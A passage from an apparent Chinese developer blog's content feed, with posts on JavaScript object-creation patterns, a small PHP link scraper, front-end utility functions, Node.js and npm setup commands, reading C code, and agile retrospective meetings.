对象（oTempCar）作为函数值。调用此函数，将创建新对象，并赋予它所有必要的属性，复制出一个我们在前面说明过的 car 对象。因此，通过这种方法，我们可以很容易地创建 car 对象的两个版本（oCar1 和 oCar2），它们的属性完全一样。</p><h3 id="为函数传递参数"><a href="#为函数传递参数" class="headerlink" title="为函数传递参数"></a>为函数传递参数</h3><p>我们还可以修改 createCar() 函数，给它传递各个属性的默认值，而不是简单地赋予属性默认值：</p><pre><code>function createCar(sColor,iDoors,iMpg) {  var oTempCar = new Object;  oTempCar.color = sColor;  oTempCar.doors = iDoors;  oTempCar.mpg = iMpg;  oTempCar.showColor = function() {    alert(this.color);  };  return oTempCar;}var oCar1 = createCar(&quot;red&quot;,4,23);var oCar2 = createCar(&quot;blue&quot;,3,25);oCar1.showColor();        //输出 &quot;red&quot;oCar2.showColor();        //输出 &quot;blue&quot;</code></pre><p>给 createCar() 函数加上参数，即可为要创建的 car 对象的 color、doors 和 mpg 属性赋值。这使两个对象具有相同的属性，却有不同的属性值。</p><h3 id="在工厂函数外定义对象的方法"><a href="#在工厂函数外定义对象的方法" class="headerlink" title="在工厂函数外定义对象的方法"></a>在工厂函数外定义对象的方法</h3><p>虽然 ECMAScript 越来越正式化，但创建对象的方法却被置之不理，且其规范化至今还遭人反对。一部分是语义上的原因（它看起来不像使用带有构造函数 new 运算符那么正规），一部分是功能上的原因。功能原因在于用这种方式必须创建对象的方法。前面的例子中，每次调用函数 createCar()，都要创建新函数 showColor()，意味着每个对象都有自己的 showColor() 版本。而事实上，每个对象都共享同一个函数。</p><p>有些开发者在工厂函数外定义对象的方法，然后通过属性指向该方法，从而避免这个问题：</p><pre><code>function showColor() {  alert(this.color);}function createCar(sColor,iDoors,iMpg) {  var oTempCar = new Object;  oTempCar.color = sColor;  oTempCar.doors = iDoors;  oTempCar.mpg = iMpg;  oTempCar.showColor = showColor;  return oTempCar;}var oCar1 = createCar(&quot;red&quot;,4,23);var oCar2 = createCar(&quot;blue&quot;,3,25);oCar1.showColor();        //输出 &quot;red&quot;oCar2.showColor();        //输出 &quot;blue&quot;</code></pre><p>在上面这段重写的代码中，在函数 createCar() 之前定义了函数 showColor()。在 createCar() 内部，赋予对象一个指向已经存在的 showColor() 函数的指针。从功能上讲，这样解决了重复创建函数对象的问题；但是从语义上讲，该函数不太像是对象的方法。</p><p>所有这些问题都引发了开发者定义的构造函数的出现。</p><h2 id="构造函数方式"><a href="#构造函数方式" class="headerlink" title="构造函数方式"></a>构造函数方式</h2><p>创建构造函数就像创建工厂函数一样容易。第一步选择类名，即构造函数的名字。根据惯例，这个名字的首字母大写，以使它与首字母通常是小写的变量名分开。除了这点不同，构造函数看起来很像工厂函数。请考虑下面的例子：</p><pre><code>function Car(sColor,iDoors,iMpg) {  this.color = sColor;  this.doors = iDoors;  this.mpg = iMpg;  this.showColor = function() {    alert(this.color);  };}var oCar1 = new Car(&quot;red&quot;,4,23);var oCar2 = new Car(&quot;blue&quot;,3,25);</code></pre><p>下面为您解释上面的代码与工厂方式的差别。首先在构造函数内没有创建对象，而是使用 this 关键字。使用 new 运算符构造函数时，在执行第一行代码前先创建一个对象，只有用 this 才能访问该对象。然后可以直接赋予 this 属性，默认情况下是构造函数的返回值（不必明确使用 return 运算符）。</p><p>现在，用 new 运算符和类名 Car 创建对象，就更像 ECMAScript 中一般对象的创建方式了。</p><p>你也许会问，这种方式在管理函数方面是否存在于前一种方式相同的问题呢？是的。</p><p>就像工厂函数，构造函数会重复生成函数，为每个对象都创建独立的函数版本。不过，与工厂函数相似，也可以用外部函数重写构造函数，同样地，这么做语义上无任何意义。这正是下面要讲的原型方式的优势所在。</p><h2 id="原型方式"><a href="#原型方式" class="headerlink" title="原型方式"></a>原型方式</h2><p>该方式利用了对象的 prototype 属性，可以把它看成创建新对象所依赖的原型。</p><p>这里，首先用空构造函数来设置类名。然后所有的属性和方法都被直接赋予 prototype 属性。我们重写了前面的例子，代码如下：</p><pre><code>function Car() {}Car.prototype.color = &quot;blue&quot;;Car.prototype.doors = 4;Car.prototype.mpg = 25;Car.prototype.showColor = function() {  alert(this.color);};var oCar1 = new Car();var oCar2 = new Car();</code></pre><p>在这段代码中，首先定义构造函数（Car），其中无任何代码。接下来的几行代码，通过给 Car 的 prototype 属性添加属性去定义 Car 对象的属性。调用 new Car() 时，原型的所有属性都被立即赋予要创建的对象，意味着所有 Car 实例存放的都是指向 showColor() 函数的指针。从语义上讲，所有属性看起来都属于一个对象，因此解决了前面两种方式存在的问题。</p><p>此外，使用这种方式，还能用 instanceof 运算符检查给定变量指向的对象的类型。因此，下面的代码将输出 TRUE：</p><pre><code>alert(oCar1 instanceof Car);    //输出 &quot;true&quot;</code></pre><h3 id="原型方式的问题"><a href="#原型方式的问题" class="headerlink" title="原型方式的问题"></a>原型方式的问题</h3><p>原型方式看起来是个不错的解决方案。遗憾的是，它并不尽如人意。</p><p>首先，这个构造函数没有参数。使用原型方式，不能通过给构造函数传递参数来初始化属性的值，因为 Car1 和 Car2 的 color 属性都等于 “blue”，doors 属性都等于 4，mpg 属性都等于 25。这意味着必须在对象创建后才能改变属性的默认值，这点很令人讨厌，但还没完。真正的问题出现在属性指向的是对象，而不是函数时。函数共享不会造成问题，但对象却很少被多个实例共享。请思考下面的例子：</p><pre><code>function Car() {}Car.prototype.color = &quot;blue&quot;;Car.prototype.doors = 4;Car.prototype.mpg = 25;Car.prototype.drivers = new Array(&quot;Mike&quot;,&quot;John&quot;);Car.prototype.showColor = function() {  alert(this.color);};var oCar1 = new Car();var oCar2 = new Car();oCar1.drivers.push(&quot;Bill&quot;);alert(oCar1.drivers);    //输出 &quot;Mike,John,Bill&quot;alert(oCar2.drivers);    //输出 &quot;Mike,John,Bill&quot;</code></pre><p>上面的代码中，属性 drivers 是指向 Array 对象的指针，该数组中包含两个名字 “Mike” 和 “John”。由于 drivers 是引用值，Car 的两个实例都指向同一个数组。这意味着给 oCar1.drivers 添加值 “Bill”，在 oCar2.drivers 中也能看到。输出这两个指针中的任何一个，结果都是显示字符串 “Mike,John,Bill”。</p><p>由于创建对象时有这么多问题，你一定会想，是否有种合理的创建对象的方法呢？答案是有，需要联合使用构造函数和原型方式。</p><h2 id="混合的构造函数-原型方式"><a href="#混合的构造函数-原型方式" class="headerlink" title="混合的构造函数/原型方式"></a>混合的构造函数/原型方式</h2><p>联合使用构造函数和原型方式，就可像用其他程序设计语言一样创建对象。这种概念非常简单，即用构造函数定义对象的所有非函数属性，用原型方式定义对象的函数属性（方法）。结果是，所有函数都只创建一次，而每个对象都具有自己的对象属性实例。</p><p>我们重写了前面的例子，代码如下：</p><pre><code>function Car(sColor,iDoors,iMpg) {  this.color = sColor;  this.doors = iDoors;  this.mpg = iMpg;  this.drivers = new Array(&quot;Mike&quot;,&quot;John&quot;);}Car.prototype.showColor = function() {  alert(this.color);};var oCar1 = new Car(&quot;red&quot;,4,23);var oCar2 = new Car(&quot;blue&quot;,3,25);oCar1.drivers.push(&quot;Bill&quot;);alert(oCar1.drivers);    //输出 &quot;Mike,John,Bill&quot;alert(oCar2.drivers);    //输出 &quot;Mike,John&quot;</code></pre><p>现在就更像创建一般对象了。所有的非函数属性都在构造函数中创建，意味着又能够用构造函数的参数赋予属性默认值了。因为只创建 showColor() 函数的一个实例，所以没有内存浪费。此外，给 oCar1 的 drivers 数组添加 “Bill” 值，不会影响到 oCar2 的数组，所以输出这些数组的值时，oCar1.drivers 显示的是 “Mike,John,Bill”，而 oCar2.drivers 显示的是 “Mike,John”。因为使用了原型方式，所以仍然能利用 instanceof 运算符来判断对象的类型。</p><p>这种方式是 ECMAScript 采用的主要方式，它具有其他方式的特性，却没有他们的副作用。不过，有些开发者仍觉得这种方法不够完美。</p><h2 id="动态原型方法"><a href="#动态原型方法" class="headerlink" title="动态原型方法"></a>动态原型方法</h2><p>对于习惯使用其他语言的开发者来说，使用混合的构造函数/原型方式感觉不那么和谐。毕竟，定义类时，大多数面向对象语言都对属性和方法进行了视觉上的封装。请考虑下面的 Java 类：</p><pre><code>class Car {  public String color = &quot;blue&quot;;  public int doors = 4;  public int mpg = 25;  public Car(String color, int doors, int mpg) {    this.color = color;    this.doors = doors;    this.mpg = mpg;  }  public void showColor() {    System.out.println(color);  }}</code></pre><p>Java 很好地打包了 Car 类的所有属性和方法，因此看见这段代码就知道它要实现什么功能，它定义了一个对象的信息。批评混合的构造函数/原型方式的人认为，在构造函数内部找属性，在其外部找方法的做法不合逻辑。因此，他们设计了动态原型方法，以提供更友好的编码风格。</p><p>动态原型方法的基本想法与混合的构造函数/原型方式相同，即在构造函数内定义非函数属性，而函数属性则利用原型属性定义。唯一的区别是赋予对象方法的位置。下面是用动态原型方法重写的 Car 类：</p><pre><code>function Car(sColor,iDoors,iMpg) {  this.color = sColor;  this.doors = iDoors;  this.mpg = iMpg;  this.drivers = new Array(&quot;Mike&quot;,&quot;John&quot;);  if (typeof Car._initialized == &quot;undefined&quot;) {    Car.prototype.showColor = function() {      alert(this.color);    };    Car._initialized = true;  }}</code></pre><p>直到检查 typeof Car._initialized 是否等于 “undefined” 之前，这个构造函数都未发生变化。这行代码是动态原型方法中最重要的部分。如果这个值未定义，构造函数将用原型方式继续定义对象的方法，然后把 Car._initialized 设置为 true。如果这个值定义了（它的值为 true 时，typeof 的值为 Boolean），那么就不再创建该方法。简而言之，该方法使用标志（_initialized）来判断是否已给原型赋予了任何方法。该方法只创建并赋值一次，传统的 OOP 开发者会高兴地发现，这段代码看起来更像其他语言中的类定义了。</p><h2 id="混合工厂方式"><a href="#混合工厂方式" class="headerlink" title="混合工厂方式"></a>混合工厂方式</h2><p>这种方式通常是在不能应用前一种方式时的变通方法。它的目的是创建假构造函数，只返回另一种对象的新实例。</p><p>这段代码看起来与工厂函数非常相似：</p><pre><code>function Car() {  var oTempCar = new Object;  oTempCar.color = &quot;blue&quot;;  oTempCar.doors = 4;  oTempCar.mpg = 25;  oTempCar.showColor = function() {    alert(this.color);  };  return oTempCar;}</code></pre><p>与经典方式不同，这种方式使用 new 运算符，使它看起来像真正的构造函数：</p><pre><code>var car = new Car();</code></pre><p>由于在 Car() 构造函数内部调用了 new 运算符，所以将忽略第二个 new 运算符（位于构造函数之外），在构造函数内部创建的对象被传递回变量 car。</p><p>这种方式在对象方法的内部管理方面与经典方式有着相同的问题。强烈建议：除非万不得已，还是避免使用这种方式。</p><h2 id="采用哪种方式"><a href="#采用哪种方式" class="headerlink" title="采用哪种方式"></a>采用哪种方式</h2><p>如前所述，目前使用最广泛的是混合的构造函数/原型方式。此外，动态原始方法也很流行，在功能上与构造函数/原型方式等价。可以采用这两种方式中的任何一种。不过不要单独使用经典的构造函数或原型方式，因为这样会给代码引入问题。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>对象令人感兴趣的一点是用它们解决问题的方式。ECMAScript 中最常见的一个问题是字符串连接的性能。与其他语言类似，ECMAScript 的字符串是不可变的，即它们的值不能改变。请考虑下面的代码：</p><pre><code>var str = &quot;hello &quot;;str += &quot;world&quot;;</code></pre><p>实际上，这段代码在幕后执行的步骤如下：</p><ol><li>创建存储 “hello “ 的字符串。</li><li>创建存储 “world” 的字符串。</li><li>创建存储连接结果的字符串。</li><li>把 str 的当前内容复制到结果中。</li><li>把 “world” 复制到结果中。</li><li>更新 str，使它指向结果。</li></ol><p>每次完成字符串连接都会执行步骤 2 到 6，使得这种操作非常消耗资源。如果重复这一过程几百次，甚至几千次，就会造成性能问题。解决方法是用 Array 对象存储字符串，然后用 join() 方法（参数是空字符串）创建最后的字符串。想象用下面的代码代替前面的代码：</p><pre><code>var arr = new Array();arr[0] = &quot;hello &quot;;arr[1] = &quot;world&quot;;var str = arr.join(&quot;&quot;);</code></pre><p>这样，无论数组中引入多少字符串都不成问题，因为只在调用 join() 方法时才会发生连接操作。此时，执行的步骤如下：</p><ol><li>创建存储结果的字符串</li><li>把每个字符串复制到结果中的合适位置</li></ol><p>虽然这种解决方案很好，但还有更好的方法。问题是，这段代码不能确切反映出它的意图。要使它更容易理解，可以用 StringBuffer 类打包该功能：</p><pre><code>function StringBuffer () {  this._strings_ = new Array();}StringBuffer.prototype.append = function(str) {  this._strings_.push(str);};StringBuffer.prototype.toString = function() {  return this._strings_.join(&quot;&quot;);};</code></pre><p>这段代码首先要注意的是 strings 属性，本意是私有属性。它只有两个方法，即 append() 和 toString() 方法。append() 方法有一个参数，它把该参数附加到字符串数组中，toString() 方法调用数组的 join 方法，返回真正连接成的字符串。要用 StringBuffer 对象连接一组字符串，可以用下面的代码：</p><pre><code>var buffer = new StringBuffer ();buffer.append(&quot;hello &quot;);buffer.append(&quot;world&quot;);var result = buffer.toString();</code></pre><p>可用下面的代码测试 StringBuffer 对象和传统的字符串连接方法的性能：</p><pre><code>var d1 = new Date();var str = &quot;&quot;;for (var i=0; i &lt; 10000; i++) {    str += &quot;text&quot;;}var d2 = new Date();document.write(&quot;Concatenation with plus: &quot; + (d2.getTime() - d1.getTime()) + &quot; milliseconds&quot;);var buffer = new StringBuffer();d1 = new Date();for (var i=0; i &lt; 10000; i++) {    buffer.append(&quot;text&quot;);}var result = buffer.toString();d2 = new Date();document.write(&quot;&lt;br /&gt;Concatenation with StringBuffer: &quot; + (d2.getTime() - d1.getTime()) + &quot; milliseconds&quot;);</code></pre><p>这段代码对字符串连接进行两个测试，第一个使用加号，第二个使用 StringBuffer 类。每个操作都连接 10000 个字符串。日期值 d1 和 d2 用于判断完成操作需要的时间。请注意，创建 Date 对象时，如果没有参数，赋予对象的是当前的日期和时间。要计算连接操作历经多少时间，把日期的毫秒表示（用 getTime() 方法的返回值）相减即可。这是衡量 JavaScript 性能的常见方法。该测试的结果可以帮助您比较使用 StringBuffer 类与使用加号的效率差异。</p><p>  再说“构造函数/原型”</p><p>  现在最通用的方式就是使用构造函数来创建类，使用原型增加公共方法。</p><p>  记住几个点 1、js除了基本类型都是引用传递 2、构造方法挂载的 prototype 下的方法会在实例化后被公用 3、写在构造方法里面的成员方法每个实例会保存一份方法代码，因此</p><pre><code>function StringBuffer () {  this._strings_ = new Array();  this._funa = function(){}  //这个方法会被每个实例生成一份，不建议这样使用}</code></pre><p>　　下面是一份典型的混合原型构造方式，推荐这种使用</p><pre><code>function StringBuffer () {  this._strings_ = new Array();}StringBuffer.prototype.append = function(str) {  this._strings_.push(str);};StringBuffer.prototype.toString = function() {  return this._strings_.join(&quot;&quot;);};</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>后端 Admin 模板收集</title>
      <link href="/frontend/frontend/admin-template-collection/"/>
      <url>/frontend/frontend/admin-template-collection/</url>
      
        <content type="html"><![CDATA[<p>adminLTE</p><p><a href="https://adminlte.io/themes/AdminLTE/index2.html" target="_blank" rel="noopener">https://adminlte.io/themes/AdminLTE/index2.html</a></p><p>colorAdmin</p><p><a href="https://seantheme.com/" target="_blank" rel="noopener">https://seantheme.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> frontend </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php采集电影天堂首页电影下载地址</title>
      <link href="/PHP/php/php-fetch-movie-script/"/>
      <url>/PHP/php/php-fetch-movie-script/</url>
      
        <content type="html"><![CDATA[<pre><code class="java">&lt;?php// 目标url http://www.dytt8.net/set_time_limit(0);define(&#39;SCRIPT_ROOT&#39;,dirname(__FILE__).&#39;/&#39;);$result_list = array();$domain = &quot;http://www.dytt8.net&quot;;$html = file_get_contents($domain);$matchs = array();preg_match_all(&quot;/\&lt;a href=\&#39;(\/html\/gndy.*)\&#39;&gt;.*&lt;\/a\&gt;/&quot;,$html,$matchs);if ($matchs[1]) {    foreach ($matchs[1] as $key =&gt; $one) {        $sub_url = $domain.$one;        $result = getUrlByPattern($sub_url);        $result_list[] = $result;    }}function getUrlByPattern($url){    $html = file_get_contents($url);    preg_match(&quot;/ftp:\/\/[^\&lt;\&quot;]*/&quot;,$html,$sub_url);    return $sub_url;}?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端开发中常用工具函数总结</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/useful-functions/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/useful-functions/</url>
      
        <content type="html"><![CDATA[<ol><li>时间格式化等方法</li></ol><p>推荐使用 moment.js 的库文件</p><ol start="3"><li>模板\循环\MAP等方法使用</li></ol><p>underscode.js 的方法</p><ol start="4"><li>表单序列化成JSON </li></ol><pre><code>$.fn.serializeJson = function() {    var serializeObj = {};    var array = this.serializeArray();    var str = this.serialize();    $(array).each(function() {        if (serializeObj[this.name]) {            if ($.isArray(serializeObj[this.name])) {                serializeObj[this.name].push(this.value);            } else {                serializeObj[this.name] = [serializeObj[this.name], this.value];            }        } else {            serializeObj[this.name] = this.value;        }    });    return serializeObj;}</code></pre><ol start="5"><li><p>字符串截取使用……填补</p><pre><code> String.prototype.strcut = function(number) {     var length = this.length;     var tmp = this.substr(0, number);     if (this.length &gt; number) {         tmp += &quot;…&quot;;     }     return tmp;</code></pre></li></ol><ol start="6"><li><p>时间格式为，xxxx 天，xxx分钟前，日期</p><pre><code> Date.prototype.Format = function(fmt, current) {     if (current) {         var diff = current - this.getTime();         if (diff &lt; 5 * 60 * 1000) {             return &quot;刚刚&quot;;         }         if (diff &lt; 60 * 60 * 1000) {             return (Math.floor(diff / (60 * 1000))) + &quot;分钟前&quot;;         }         if (diff &lt; 24 * 60 * 60 * 1000) {             return (Math.floor(diff / (60 * 60 * 1000))) + &quot;小时前&quot;;         }         if (diff &lt; 30 * 24 * 60 * 60 * 1000) {             return (Math.floor(diff / (24 * 60 * 60 * 1000))) + &quot;天前&quot;;         }         if (diff &lt; 12 * 30 * 24 * 60 * 60 * 1000) {             return (Math.floor(diff / (30 * 24 * 60 * 60 * 1000))) + &quot;月前&quot;;         }         if (diff &gt; 12 * 30 * 24 * 60 * 60 * 1000) {             return (Math.floor(diff / (12 * 30 * 24 * 60 * 60 * 1000))) + &quot;年前&quot;;         }     }     var o = {         &quot;Y+&quot;: this.getFullYear(), //月份          &quot;M+&quot;: this.getMonth() + 1, //月份          &quot;d+&quot;: this.getDate(), //日          &quot;h+&quot;: this.getHours(), //小时          &quot;m+&quot;: this.getMinutes(), //分          &quot;s+&quot;: this.getSeconds(), //秒          &quot;q+&quot;: Math.floor((this.getMonth() + 3) / 3), //季度          &quot;S&quot;: this.getMilliseconds() //毫秒      };     if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (this.getFullYear() + &quot;&quot;).substr(4 - RegExp.$1.length));     for (var k in o)         if (new RegExp(&quot;(&quot; + k + &quot;)&quot;).test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : ((&quot;00&quot; + o[k]).substr((&quot;&quot; + o[k]).length)));     return fmt; }</code></pre></li><li><p>解析URL</p><pre><code>function parseUrl() {        var arr = location.search.split(&#39;?&#39;)[1].split(&#39;&amp;&#39;);        var params = {};        for (var i = 0, l = arr.length; i &lt; l; i++) {            var param = arr[i].split(&#39;=&#39;);            params[param[0]] = param[1];        }        return params;</code></pre></li><li><p>获取get参数</p><pre><code>function getParameterByName(name) {        name = name.replace(/[\[]/, &quot;\\[&quot;).replace(/[\]]/, &quot;\\]&quot;);        var regex = new RegExp(&quot;[\\?&amp;]&quot; + name + &quot;=([^&amp;#]*)&quot;),            results = regex.exec(location.search);        return results === null ? &quot;&quot; : decodeURIComponent(results[1].replace(/\+/g, &quot; &quot;));</code></pre></li></ol><ol start="9"><li>函数节流，让频繁事件触发更稀疏提高性能，例如及时搜索功能。使用方法为fn 为事件响应函数，delay 为间隔时间,调用 throttle(fn,delay) 返回一个新的函数给事件即可</li></ol><pre><code>        function throttle(fn, delay) {            var timer = null;            return function() {                var context = this,                    args = arguments;                clearTimeout(timer);                timer = setTimeout(function() {                    fn.apply(context, args);                }, delay);            };</code></pre><ol start="10"><li>防止表单多次提交，和9中一样，返回一个新的函数<pre><code>/** * 防止多次点击函数 * * fn 完成时调用回调 *  function fn(event,end) { *       (typeof end === &quot;function&quot;) &amp;&amp; end(); // 操作完成 *  } */function noRepeateTap(fn) {    var $obj;    return function(event) {        $obj = $(this);        if ($obj.data(&quot;loadding&quot;) === &quot;true&quot;) {            return;        }        $obj.data(&quot;loadding&quot;, &quot;true&quot;).addClass(&#39;loadding&#39;);        fn.call(this, event, function end() {            $obj.data(&quot;loadding&quot;, &quot;&quot;).removeClass(&#39;loadding&#39;);            return;        });    }</code></pre></li></ol><p>第10个的使用例子</p><pre><code>// 绑定事件$(container).on(&#39;click&#39;, &#39;.btn-cancel&#39;, noRepeateTap(cancel));    // 事件响应函数    function cancel(event, end) {        event.preventDefault();             // 模拟异步请求              setTimeout(function(){            end(); // 需要手动调用注入的完成函数，通知完成,函数自动添加loadding class 类，用于调整样式，完成后自动移除        },5000)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端性能优化</title>
      <link href="/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/web-frontend-performance/"/>
      <url>/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/performance/web-frontend-performance/</url>
      
        <content type="html"><![CDATA[<p>减少http请求，使用图片拼合压缩 、压缩css、压缩js</p><p>　　b、启用gzip压缩</p><p>　　c、尽量少试用cookie，静态资源使用子域名</p><p>　　d、使用cdn以及缓存</p><p>　　e、使用异步加载以及pipe</p><p>​     f、避免图片失效，以及少使用 iframe</p><p>　　g、避免404页面</p>]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ubuntu 下安装 nodejs</title>
      <link href="/nodejs/nodejs/install-nodejs-under-ubuntu/"/>
      <url>/nodejs/nodejs/install-nodejs-under-ubuntu/</url>
      
        <content type="html"><![CDATA[<pre><code>sudo apt-get install nodejssudo apt-get install npmsudo apt-get install nodejs-legacysudo add-apt-repository ppa:chris-lea/node.jssudo apt-get updatesudo apt-get install python-software-properties python g++ make nodejs</code></pre><p> 需要特别注意就是 install nodejs-legacy，这个包，因为如果不装这个包没有node 命令，所以需要安装legacy</p><pre><code>sudo apt-get install nodejs-legacy</code></pre>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nodejs 热重启工具</title>
      <link href="/nodejs/nodejs/nodejs-change-source/"/>
      <url>/nodejs/nodejs/nodejs-change-source/</url>
      
        <content type="html"><![CDATA[<p>1.通过config命令</p><pre><code>npm config set registry http://registry.cnpmjs.org npm info underscore （如果上面配置正确这个命令会有字符串response）</code></pre><p>2.命令行指定</p><pre><code>npm --registry http://registry.cnpmjs.org info underscore</code></pre><p>3.编辑 <code>~/.npmrc</code> 加入下面内容</p><pre><code>registry = http://registry.cnpmjs.org</code></pre><p>搜索镜像: <a href="http://cnpmjs.org/" target="_blank" rel="noopener">http://cnpmjs.org</a></p><p>建立或使用镜像,参考: <a href="https://github.com/fenmgk2/cnpmjs.org" target="_blank" rel="noopener">https://github.com/fenmgk2/cnpmjs.org</a></p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何阅读别人的C代码</title>
      <link href="/c-c/c&amp;c++/read-c-code/"/>
      <url>/c-c/c&amp;c++/read-c-code/</url>
      
        <content type="html"><![CDATA[<p>这段时间阅读别人的大量的数据结构的相关程序，每个人的写法和风格不尽相同，看得相当难受，特别是些条件变化的for循环，相当的不好处理，但是还是有些收获和心得，整理了下，写出来</p><p>　　数据机构的试题中有两种情况，一个就是给你说了大致的程序功能和思想，让你补全你的程序，这种问题的麻烦就是不是自己完全的写作，以至于自己的代码，不是很好的适合出题者的思路。第二个就是给你一段程序让你读懂后，说出他的功能或者给你一个初值让你扮作debuger自己过一遍，有点像白盒测试，难度因人而异，我倒是喜欢这种的题目。因为只要读懂了就好办，也可以锻炼自己的代码阅读水平。</p><p>　 针对第一种情况，给出了程序功能和思想，补全程序的题目。注意一下几点：</p><p>　　　1、最基本的就是给一个初值，先过一遍，了解下程序需要用到那些变量和值，这个和写程序是一样的。程序不是写一行才去想下一行怎么写，走到哪里需要定义变量就补上一行代码，完了到处都是局部变量，程序的结构非常差。总而言之，就是先总体看下全局的需要什么东西，再想办法。</p><p>　　　2、然后就是根据他的功能，自己先把这个程序实现下，不用太精确，用自己的思想勘察这个问题，然后原来的代码的思想就变得相当好理解了，当然这个程序不需要自己写出来，在脑袋里捉摸下即可，模拟下原作者的思路未尝不可。</p><p>　　　3、基于以上两点，有时候我在看别人代码是很自然的就结合了上面两点来做，先使用第二点把自己的细想先实现了，自己想通要怎么干，再去看别人的东西，相当好办，最后传个值验证下，基本就没问题了。</p><p>　　</p><p>　那么对于第二个情况，其实也和第一种差不多，但是还是要注意的就是，看代码的时候把每个值得变化用一个表写在旁边，制定一个变量赋值表，还有就是很重要的一点！一边读一边写上注释，这个相当好用，避免自己前面的忘记了，看第二遍也是相当好的。然后就是，在看代码是，突破点再变化的量和不是常常变化的量，这点好像不是很好理解，很多的排序操作都会有用来临时存储的变量，有时候称作哨兵，这个变量往往是关键，频繁的赋值取值，作用很大，画出与之相关的赋值和取值流程，代码就好懂多了。</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Retro</title>
      <link href="/team/team/retro/"/>
      <url>/team/team/retro/</url>
      
        <content type="html"><![CDATA[<p>Retro 是敏捷软件开发方法中的一种会议形式，Retro 这个单词的全称是 Retrospective，意为回顾、审查。Retro 这种会议形式适用于某个项目完成后，或任务进展到某一个阶段时对之前的工作进行复盘、检查。</p><p>这种会议形式在海外的公司中非常流行，可能发生在某一次培训完成后，发现培训中的问题进行改进；那些做的好的实践，以便于继续坚持；或者挖掘团队中的金点子和建议。</p><p>所以在会议中，要求全员积极参与，一般来说聚焦于3个问题：</p><ol><li>那些实践对我们非常有帮助？</li><li>那些事例对团队或项目造成不良影响？</li><li>在工作期间有什么疑惑或者问题？</li></ol><p>举例来说，在一个培训项目完成后的 Retro 会议可能会收集到如下的清单：</p><p>Well：</p><ol><li>记住每个学员的名字</li><li>持续和学员沟通</li><li>在每次课程前强调纪律（Ground Rule）</li><li>PPT上的字足够大</li></ol><p>Less Well：</p><ol><li>每天结束前没有及时总结</li><li>没有足够的答疑时间</li><li>没有布置作业</li></ol><p>于是，根据 Less well 中的条目，制定改进行动：</p><ol><li>在课程计划中添加每日总结的内容</li><li>使用Parking Lot（停车场，一张大白纸放置学生疑问的便利贴）收集没有及时回复的问题，在其余时间回复</li><li>设计作业和批改作业</li></ol><p>因此只要坚持，使用 Retro 这种会议形式，随着项目的进行，就会有足够多的培训经验被积累下来。这就是 Retro 的魅力， Retro 本身只是一种形式，但是提供了一种持续改进的方法。</p><p>当然，Retro 也不一定限于这三个方面，也有一些其他的 Retro 形式。例如从项目的风险角度出发，一种有趣的 Retro形式 《Anchors and Engine》：</p><ol><li>有那些风险或者阻碍项目进行的事情（Anchors）?</li><li>有哪些在促使项目往好的方向发展的（Engine）？</li></ol><p>你可以在 <a href="http://www.funretrospectives.com/anchors-and-engine/" target="_blank" rel="noopener">funretrospectives.com</a> 的网站上找到类似更多的Retro形式。</p><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>常用的 Retro 具体的操作方法有两种，一种是主持人白板上画出制定区域，参与者通过报事贴发布自己的想法；另一种是通过一些在线工具让参与者更为方便的参与Retro。</p><p>这里给出便利贴的操作方法，在线工具的方法大同小异，并使用最基本的回顾模型（Well、Less well、Puzzle）。一般 Retro 的时间在30-60分钟，需要相关的人员全部都参与，其中需要一个主持者全程引导。</p><p>下面是具体的操作步骤：</p><ol><li>主持人在白板上书写 Well、Less well、Puzzle 三列。</li><li>主持人回顾上次 Retro 的行动执行情况。</li><li>所有参与者在5分钟内书写报事贴，并贴到白板上，每个报事贴只书写一项内容。</li><li>主持人对所有报事贴分类，把相同和类似的内容贴到一起。</li><li>所有人员需要讨论 Less well 的内容，得出行动，但限于时间原因主持人决定讨论的数量，一般 3 - 5项。</li><li>所有人员使用“正”字计数法，对分组后的内容进行投票。</li><li>团队逐个讨论 Less well，找到可以采取的行动。例如在某次教学活动中，物料准备不够充分，我们可以采取的行动应该是，每一次教学应该有专人根据物料清单检查物料情况。</li><li>得出的行动应该指派到专人负责，否则没有意义。</li></ol><p><img src="/team/team/retro/26731.png" alt="img"></p><p>（一个最普通的 Retro 模式）</p><p>在线的操作流程类似，可以使用 <a href="https://ideaboardz.com/" target="_blank" rel="noopener">https://ideaboardz.com/</a> 等相关工具用用电子话的方式进行 Retro。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>在 Retro 开始前，如果是新组建的团队，有可能有团队成员处于某些原因，不放心说出自己真实感受和问题，可以进行安全度检查。具体操作方法是进行匿名投票，使用便利贴书写 “安全” “不安全” 然后由主持人统计查看。如果团队中存在感受到不安全的成员出现，让参与者中职级最高的参与者离开，然后再次投票，直到安全为止。</li><li>如果有参与者认为团队环境不安全，无法畅所欲言，不去解决不安全因素而直接开始，Retro 的效果会只能是形式化的，对项目的推动没有意义。</li><li>Retro 很重要的一个点是持续坚持，如果只做一次 Retro 实际上意义不大。如果一个团队定期都会举行 Retro，那么团队成员就会时刻准备下一次 Retro 可以讨论的问题。</li><li>Retro 